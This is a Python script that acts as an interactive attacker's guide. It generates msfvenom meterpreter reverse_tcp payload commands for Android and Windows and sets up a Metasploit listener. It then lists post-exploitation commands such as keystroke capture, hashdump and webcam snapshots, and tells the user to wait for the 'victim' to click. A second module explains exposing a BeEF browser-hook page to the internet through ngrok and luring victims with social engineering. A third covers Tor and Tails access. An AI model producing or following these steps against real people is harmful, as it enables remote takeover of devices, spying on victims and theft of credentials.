from time import sleep
import numpy as np

print("0 - Payload\n1 - BEEF\n2 - Dark Web\n\n")
var = input("Type a Number: ")


def payload():
  print("\nYou selected Payload")
  sleep(2)
  print("Let's Go")
  print("Be ready for this journey!\n")
  sleep(2.5)
  print("So first we have to start the console so type:")
  print("\n----> msfconsole\n")
  sleep(5)
  print("\nOkey so the basic overview command is: ")

  print("\nmsfvenom -p {platform} {LHOST} {LPORT} -o {filename}.{extenstion}")

  print("\n\nLet's make it even more easy for you! ")
  sleep(1.5)
  P = input("Enter your OS (Android OR Windows): ")
  L = input("Type your LHOST: ")
  LP = input("Type your LPORT: ")
  T = input("Type your filename: ")

  if P == "a" or P == "A" or P == "Android" or P == "android":
    print("\nYour command for android payload: \n")

    # Create the numpy array with placeholders
    ww = np.array([
        "msfvenom -p ", "android/meterpreter/reverse_tcp", f"LHOST={L}",
        f"LPORT={LP}", f"-o {T}.apk"
    ])

    # Join all elements of ww while removing the quotes and brackets
    command = " ".join(part.strip("[]'\"") for part in ww)
    print(command)

  elif P == "Windows" or P == "w" or P == "W":
    print("\nYour command for windows payload: \n\n")

    # Create the numpy array with placeholders
    ww2 = np.array([
        "msfvenom -p ", "windows/meterpreter/reverse_tcp", f"LHOST={L}",
        f"LPORT={LP}", f"-o {T}.exe"
    ])

    # Join all elements of ww2 while removing the quotes and brackets
    command = " ".join(part.strip("[]'\"") for part in ww2)

    print(command)

  sleep(10)
  print(
      "\n\nAfter that you can use the following command to start the listener: \n"
  )
  print("----> use multi/handler\n")
  sleep(2)
  print(
      "\nAfter You have started the listener you can see this [ msf6 exploit(multi/handler) > ]\n"
  )
  print("Based on your previous inputs these can be a list of valid commands:")
  print("These are some valid commands: ")
  EP = P
  AP = P
  WL = L

  if AP == "w" or AP == "W" or AP == "Windows":
    WLL = WL
    slc_str2 = str(ww2[1:2]).strip("[]'")

    print(f"\n1. ----> set payload {slc_str2}\n")
    print(f"2. ----> set lhost {L}\n")
    print(f"3. ----> set lport {LP}\n")
    print("4. ----> exploit")

  if EP == "a" or EP == "A" or EP == "Android":
    slc_str = str(ww[1:2]).strip("[]'")

    print(f"\n1. ----> set payload {slc_str}\n")
    print(f"2. ----> set lhost {L}\n")
    print(f"3. ----> set lport {LP}\n")
    print("4. ----> exploit")

  print("\n\nWait for the Victim to click on the payload.")
  sleep(5)
  print(
      "After the victim has clicked on the payload. We can start our work.\n")
  sleep(2)
  print("The actual Hacking starts here.")
  print("Here are some List of Valid Commands:")
  print(
      "1.webcam_snap\n2.keyscan_start\n3.keyscan_stop\n4.keyscan_dump\n5.hashdump\n6.getpid\n7.getprivs\n8.sysinfo\n9.upload or download\n10.screenshot\n11.reboot\n12.shutdown\n13.getuid\n14.geteuid\n"
  )

  print(
      "\033[1mFrom here on you can Just play with the user and scare them. Don't try this anywhere else, this is Strictly for Educational Purposes only.\033[0m\n"
  )
  text = "\033[1m'With Great Power,Comes Great Responsibility'\033[0m"
  w = 100
  center = text.center(w)
  print(center)


def print_clickable_link(url, text):
  print(f"\033]8;;{url}\033\\{text}\033]8;;\033\\")


def beef():
  # print("This module is still in development. It can have some issues.")
  print("\nYou selected BEEF")
  sleep(2)
  print("Let's Go")
  print("Be ready for this journey!\n")
  sleep(2.5)
  print("\n\033[1mSTEP 1..........\033[0m\n")
  print("First we have to forward our ports.")
  print("For that we have to setup ngrok.")
  print("\033[1mhttps://ngrok.com/\033[0m")
  print("\nPlease grant permissions for redirecting you to the website.")
  sleep(2)
  print("\nDownload the ngrok.zip file.")
  sleep(5)
  print(
      "\n\nGo to the location of the ngrok.zip file. ( cd /home/kali/Downloads )"
  )
  sleep(2.5)
  print("\nType this command: \nsudo tar -xvzf <name of ngrok file> ")
  sleep(2.5)
  print("\nThen you have to add your authtoken.")
  sleep(2.5)
  print(
      "\nSo for that type this: \nsudo ngrok config add-authtoken <your authtoken>"
  )

  sleep(5)

  print(
      "\n\033[1mCongratulations!\033[0m\nYou have succesfully set upped ngrok."
  )
  sleep(6)

  print("\n\033[1mSTEP 2..........\033[0m\n")
  print("Setup BEEF.\n")
  print("\033[1mType this command: \033[0m")
  print("git clone https://github.com/beefproject/beef\n")
  sleep(4)
  print("Go to the directory of the beef ( /home/kali/beef )\n")
  print("Type this: \n\033[1m./install\033[0m")
  print("\nThis will install all the dependencies.")

  sleep(6)

  print("\n\033[1mSTEP 3..........\033[0m\n")
  print("Now we have to start port forwarding.\n")
  print("\033[1mNote: \033[0mType this in the Directory of the ngrok file.\n")
  print("For that type this: \n\033[1m./ngrok http 3000\033[0m")
  print("\nThis will start port forwarding.\n")
  sleep(4)
  print(
      "\033[1mThe only reason we are doing this (port frowarding) is because the original link of BEEF only works in LAN (Local Area Network) but we want to execute it on the whole internet i.e WAN (Wide Area Network) so we forward our ports to a port which is executable for every device on the internet.\033[0m"
  )

  sleep(15)

  print("After everything has been Done. We can start our Work.")
  sleep(2.5)
  print(
      "Open Another Terminal. Go to the directory of the beef ( /home/kali/beef )\n"
  )
  sleep(1.5)
  print("Type this: \n\033[1mnano config.yaml\033[0m")
  sleep(2.5)
  print(
      "\nYou can now see the 'Credentials' section. Change the username and passwd as per your need."
  )
  sleep(5)
  print(
      "\nScroll down until you can see the 'public: ' section. It will have '#' before the sentences remove it. Go to the ngork Terminal and copy address infront of 'Forwarding: '."
  )
  sleep(2.5)
  print(
      "\nCopy the address after ' https://'. Then paste this in the 'public: ' section of the config.yaml file in the value of 'Host:'."
  )
  sleep(2)
  print("\nChange the value after 'https: 'to 'true'.\n")
  sleep(5)
  print(
      "\nNow save the file and exit the nano editor.By pressing 'Ctrl + X' and then 'Y' and then 'Enter'.\n"
  )
  sleep(2.5)
  print("\nNow we have to start the BEEF.\n\033[1mSo Type:\n\033[0m./beef\n")
  print(
      "Copy the address of ui panel and paste it in your favorite browser, Login with your credentials."
  )
  sleep(7)
  print("Now you can see the BEEF UI.\n")
  print("You can see 2 'here' in the UI.")
  sleep(2.5)
  print("\nGo and click on the second one.")
  print("This will open the hook website.")
  sleep(5)
  print(
      "\nClick on the address bar and delete the address before '/demos/butcher/index.html' and paste the ngrok 'Forwarding: ' link. \n\033[1mBOOM!\033[0myou have a link that works onn the whole internet.\n"
  )
  sleep(5)
  print("Now you can use this link to execute the BEEF on the whole internet.")
  print(
      "Use Social Engineering skills to get the victim to click on the link.")
  sleep(2.5)
  print(
      "\n\033[1mFrom here on you can Just play with the user and scare them. Don't try this anywhere else, this is Strictly for Educational Purposes only.\033[0m\n"
  )
  text = "\033[1m'With Great Power,Comes Great Responsibility'\033[0m"
  w = 100
  center = text.center(w)
  print(center)


def darkWeb():
  print("This Module is still in development. It can have some issues or bugs.")
  print(" ")
  print("You selected Dark Web.")
  sleep(2)
  print("Let's Go")
  print("Be ready for this journey!\n")
  sleep(2.5)
  print("There are 3 ways to access the Dark Web.")
  print("Which I have Divided into Levels.")
  print(" ")
  print(" ")
  print("\033[1mLevel 1: \033[0m")
  print("First way To access the Dark Web is :\033[1mTor\033[0m")
  sleep(2)
  print(" ")
  print("------------------------------------")
  print("\033[1mDo this At you own risk.\033[0m")
  print("------------------------------------")
  print(" ")
  print("TOR : The Onion Router")
  print(
      "      This is a most common way that people use to access the Dark Web. Which is not recommended ofcourse, and I do not recommemed you as well."
  )
  sleep(2.5)
  print(" ")
  print(
      "You can download TOR in your own Machine (Mac,Windows,Linux). This is the easiest way to access the Dark Web."
  )
  print("")
  print("Just install with the help of wizard and just click on 'Connect'. ")
  print(" ")
  print(
      "You are in dark web But no you are not safe. So you can still visit all the normal and the Dark web websites but its still not very recommended."
  )
  sleep(6)
  print(" ")
  print("\033[1mLevel 2: \033[0m")
  print("Second way to access the Dark Web is :\033[1m\033[0m")
  print("connect To a Trusted VPN")
  print("For ex. NordVPN, Surfshark, ExpressVPN, etc.")
  print(" ")
  print(
      "First connect to your favourite VPN and then lauch the TOR Browser and connect.(Not Recommeded)"
  )
  sleep(6)
  print("")
  print("\033[1mLevel 3: \033[0m")
  print(
      "The not the most secure but secure enough way to access the Dark Web.")
  print(
      "\033[1mNote:\033[0m You need to have a USB stick (above 8 GB of storage) for this Level."
  )
  print(" ")
  print("\033[1mTails Linux\033[0m")
  print(" ")
  print("Go to https://tails.net/")
  print("click on 'Install Tails'")
  print(" ")
  print("Select for 'usb stick'")
  print(" ")
  print(
      "Download Would start. Meanwhile we can download something which can write that data into our USB stick."
  )
  print(" ")
  print("here comes in 'BalenaEtcher'")
  print("https://etcher.balena.io/")
  print("")
  print(
      "Click on 'Download Etcher'. Select portable version according to you machine .This would start Downlading."
  )
  print("")
  print("Plugin your USB stick and if not the format it.")
  print("Open balenaEtcher")
  print(" ")
  print("Click on Flash from file and select the tails ISO file.")
  print(" ")
  print("Select you USB drive and click on 'Flash'")
  print(" ")
  print("\033[1mCongratulations!\033[0m")
  print("You have succesfully flashed a OS on a usb stick.")
  print(" ")
  print("Now boot into your Usb Stick from you BIOS Menu.")
  


if var == "0":
  payload()

elif var == "1":
  beef()

elif var == "2":
  darkWeb()

else:
  print("Choose between 0 to 2")
  exit()
